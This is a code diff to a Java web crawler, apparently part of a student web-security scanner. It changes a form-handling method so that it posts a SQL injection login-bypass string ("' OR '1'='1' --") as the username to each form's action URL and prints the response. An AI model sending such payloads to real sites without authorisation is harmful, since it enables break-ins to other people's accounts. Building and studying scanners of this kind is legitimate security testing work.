@@ -6,16 +6,12 @@ package org.daiict.mscit.pl1.wasc.crawler;
 
 import java.io.IOException;
 import java.util.ArrayList;
-import java.util.HashMap;
 import java.util.List;
-import java.util.Map;
-import java.util.logging.Level;
-import java.util.logging.Logger;
 import org.daiict.mscit.pl1.wasc.db.DAL;
 import org.daiict.mscit.pl1.wasc.entities.Link;
 import org.jsoup.Connection;
 import org.jsoup.Jsoup;
-import org.jsoup.helper.*;
+import org.jsoup.helper.HttpConnection;
 import org.jsoup.nodes.Document;
 import org.jsoup.nodes.Element;
 import org.jsoup.select.Elements;
@@ -90,13 +86,15 @@ public class Crawler {
     public static void displayForm(String url) {
         try {
             Document doc = Jsoup.connect(url).get();
-
+            String submitURL="";
+            
             Elements hidden = doc.select("input[type=hidden]");
 
             Elements forms = doc.select("form[action]");
             Elements textboxes = null;
             for (Element e : forms) {
                 System.out.println(e.attr("abs:action"));
+                submitURL=e.attr("abs:action");
                 textboxes = e.getElementsByAttributeValue("type", "text");
                 textboxes.addAll(e.getElementsByAttributeValue("type", "password"));
                 for (Element child : textboxes) {
@@ -107,11 +105,19 @@ public class Crawler {
             //Document responseDoc = Jsoup.connect(url).ignoreHttpErrors(true).ignoreContentType(true).data("", "").post();
             //responseDoc.toString();
             
-            Connection con=Jsoup.connect(url).ignoreContentType(true).ignoreHttpErrors(true);
+            Connection con=Jsoup.connect(submitURL).ignoreContentType(true).ignoreHttpErrors(true);
+            con=con.data("uname","' OR '1'='1'  -- '","pass","bomb");
             
             for(Element e1:hidden){
+                System.out.println(e1.toString());
                 con=con.data(e1.attr("name"), e1.attr("value"));
             }
+            HttpConnection.Response res=(HttpConnection.Response)con.execute();
+            
+            int statusCode=res.statusCode();
+            Document responseDoc=res.parse();
+            System.out.println("Status Code : " + statusCode);
+            System.out.println(responseDoc.toString());
 
         } catch (IOException ex) {
         }
